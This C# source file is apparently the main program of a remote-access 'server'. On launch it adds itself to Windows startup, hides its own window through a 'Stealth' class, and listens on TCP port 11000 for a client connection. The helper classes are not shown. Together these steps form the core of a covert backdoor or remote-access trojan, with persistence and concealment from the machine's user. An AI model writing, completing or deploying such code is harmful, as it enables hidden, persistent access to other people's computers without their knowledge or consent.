using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Net;

namespace Server
{

    class Program
    {
        static Connection con; // used to make the connection with client
        static int portNumber = 11000;

        static StartUP startup; // add app to windows startup
        static Stealth stlh; // used for server stealth

        static void Main(string[] args)
        {

            Console.WriteLine("Server is starting ...");

            //startup
            startup = new StartUP();
            startup.setAsStartup(true);

            //make the server window not visible 
            windowVisible(false);


           //##############################
           //Allow user to specify port number
           // Console.WriteLine("Enter port number:");
           // string portStr = Console.ReadLine();
           // int port;
           // bool check_integer = int.TryParse(portStr, out port);
           //check if the value entered is numeric & in the tcp port range
           // if (check_integer && (port >= 0 && port <= 65536))
           // {
           //     createServer(port); //ready to listen on given port
           //
           // }
           //else
           // {
           //    Console.WriteLine("Please try again ...");
           // }
           //##############################


            createServer(portNumber); //ready to listen on given port 
            Console.ReadKey();
        }

        static void windowVisible(bool visible)
        {
            stlh = new Stealth(visible);
        }


        static void createServer(int port_number)
        {

            //check network available
            bool b = checkNetowrkAvailable();
            if (!b)
            {
                Console.WriteLine("ERROR - No network connection.");
                return;

            }
            else
            {
                //network is available
                con = new Connection(port_number);
                con.StartListening();
            }

        }

       static private bool checkNetowrkAvailable()
        {

            return System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable();
        }

    }
}
